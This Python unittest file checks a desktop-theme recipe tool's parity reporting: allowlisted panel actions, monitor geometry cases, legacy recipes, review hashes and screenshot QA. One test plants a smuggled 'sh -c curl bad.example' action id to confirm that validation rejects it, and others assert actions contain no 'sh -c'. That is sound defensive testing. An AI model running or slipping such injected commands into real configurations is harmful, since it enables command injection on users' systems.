"""Creator -> validated recipe -> declared native contract, without activation."""

import json
import os
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from macrice.de import creator_runtime_parity as parity, recipes, review
from macrice.de.visual_qa import compare

try:
    from PIL import Image
except ImportError:
    Image = None


ROOT = Path(__file__).resolve().parents[1]
DEMOS = (
    ROOT / "examples/wayland/heritage-composer-v10.json",
    ROOT / "examples/wayland/orbit-composer-v10.json",
)


class CreatorRuntimeParityTests(unittest.TestCase):
    def test_two_distinct_composer_rices_have_real_allowlisted_interactions(self):
        results = [parity.describe(str(path)) for path in DEMOS]
        self.assertNotEqual(results[0]["recipe"]["semantic_sha256"],
                            results[1]["recipe"]["semantic_sha256"])
        self.assertEqual([item["recipe"]["schema_version"] for item in results], [10, 10])
        for result in results:
            self.assertEqual(result["python_validation"], "passed")
            self.assertEqual(result["rust_parser_execution"], "not_performed")
            self.assertEqual(result["native_render_execution"], "not_performed")
            self.assertEqual(result["real_input_accessibility_validation"], "not_performed")
            self.assertGreater(len(result["components"]), 10)
            for row in result["components"]:
                self.assertEqual(row["runtime_evidence"],
                                 "contract-only-not-a-render-or-input-test")
                self.assertTrue(row["accessibility"])
                if row["interactive"]:
                    self.assertTrue(row["allowed_action"])
                    self.assertNotIn("/", row["allowed_action"])
                    self.assertNotIn("sh -c", row["allowed_action"])
                    self.assertTrue(row["state_contract"])
                else:
                    self.assertIsNone(row["allowed_action"])
            interactions = {(row["area"], row["binding"]) for row in result["components"]
                            if row["interactive"]}
            self.assertIn(("desktop", "terminal"), interactions)
            self.assertIn(("menu", "logout"), interactions)
            self.assertIn(("panel-wide", "wifi-toggle"), interactions)
            self.assertTrue(any(row["accessibility"] == "conditional-button"
                                for row in result["components"]))
        self.assertNotEqual(
            [(r["area"], r["kind"], r["binding"]) for r in results[0]["components"]],
            [(r["area"], r["kind"], r["binding"]) for r in results[1]["components"]])

    def test_real_small_full_hd_fractional_and_second_monitor_rules_are_explicit(self):
        results = [parity.describe(str(path)) for path in DEMOS]
        for report in results:
            cases = {item["case"]: item for item in report["output_cases"]}
            self.assertEqual(len(cases), 5)
            self.assertEqual(cases["small"]["logical"], [640, 480])
            self.assertEqual(cases["small"]["panel_mode"], "compact")
            self.assertEqual(cases["desktop"]["logical"], [1920, 1080])
            self.assertEqual(cases["desktop"]["panel_mode"], "wide")
            self.assertEqual(cases["fractional"]["logical"], [1093, 614])
            self.assertEqual(cases["second-monitor"]["logical"], [1024, 768])
            self.assertIn("native_reflow_and_visibility", cases["small"])
            self.assertEqual(len(cases["small"]["hidden_desktop_widgets"]), 1)
        orbit = {item["case"]: item for item in results[1]["output_cases"]}
        self.assertIn("declared-outside-logical-output",
                      [entry["code"] for entry in orbit["small"]["declared_geometry_warnings"]])
        self.assertTrue(all("not_verified" in item["native_reflow_and_visibility"]
                            for item in orbit.values()))

    def test_legacy_section_recipes_are_inventoryable_without_version_migration(self):
        for token in ("classic", "chrome"):
            report = parity.describe(token)
            self.assertEqual(report["recipe"]["schema_version"], 1)
            self.assertTrue(any(item["area"] == "panel-wide" for item in report["components"]))
            self.assertFalse(any(item["area"] == "panel-compact" for item in report["components"]))
            self.assertEqual(report["python_validation"], "passed")
            self.assertEqual(report["output_cases"][0]["panel_mode"], "wide")

    def test_script_injection_cannot_reach_parity_inventory(self):
        raw = json.loads(DEMOS[0].read_text())
        raw["panel"]["layout"]["end"][0] = {
            "type": "action", "id": "sh -c curl bad.example", "label": "Danger"
        }
        with tempfile.TemporaryDirectory() as folder:
            candidate = Path(folder) / "invalid.json"
            candidate.write_text(json.dumps(raw))
            candidate.chmod(0o600)
            with self.assertRaises(recipes.RecipeError):
                parity.describe(str(candidate))
            with mock.patch("sys.argv", ["creator_runtime_parity", str(candidate)]), \
                 mock.patch("builtins.print") as output:
                self.assertEqual(parity.main(), 2)
            self.assertNotIn(folder, output.call_args.args[0])

    def test_review_hash_is_identical_to_parity_hash_without_installation(self):
        with tempfile.TemporaryDirectory() as folder:
            config = Path(folder) / "unused-config"
            with mock.patch.dict(os.environ, {"XDG_CONFIG_HOME": str(config)}), \
                 mock.patch("macrice.de.session.start") as start, \
                 mock.patch("macrice.de.recipes.change_selection") as select:
                for source in DEMOS:
                    result = parity.describe(str(source))
                    self.assertEqual(result["recipe"]["semantic_sha256"],
                                     review.review(str(source))["summary"]["semantic_sha256"])
                self.assertFalse(config.exists())
                start.assert_not_called()
                select.assert_not_called()

    @unittest.skipIf(Image is None, "Pillow is not installed")
    def test_visual_qa_checks_composition_widgets_not_only_desktop_shortcuts(self):
        with tempfile.TemporaryDirectory() as folder:
            root = Path(folder)
            payload = json.loads(DEMOS[0].read_text())
            # The parser permits broad declared coordinates; the screenshot
            # checker must report their geometric risks separately.
            payload["composition"]["widgets"][0]["x"] = 950
            payload["composition"]["widgets"][0]["y"] = 730
            source = root / "composer.json"
            source.write_text(json.dumps(payload))
            source.chmod(0o600)
            capture = root / "native-capture.png"
            Image.new("RGB", (1024, 768), "#16263a").save(capture)
            report = compare(capture, capture, recipe_token=str(source))
            regions = {entry["id"]: entry for entry in report["regions"]}
            self.assertIn("desktop-widget-desk-heading", regions)
            self.assertLess(regions["desktop-widget-desk-heading"]["visible_fraction"], 1)
            issues = {entry["code"] for entry in report["layout_issues"]
                      if entry["region"] == "desktop-widget-desk-heading"}
            self.assertEqual(issues, {"widget_outside_output", "widget_overlaps_panel"})
            self.assertTrue(report["identical"], "Geometry is separate from pixel deltas")


if __name__ == "__main__":
    unittest.main()
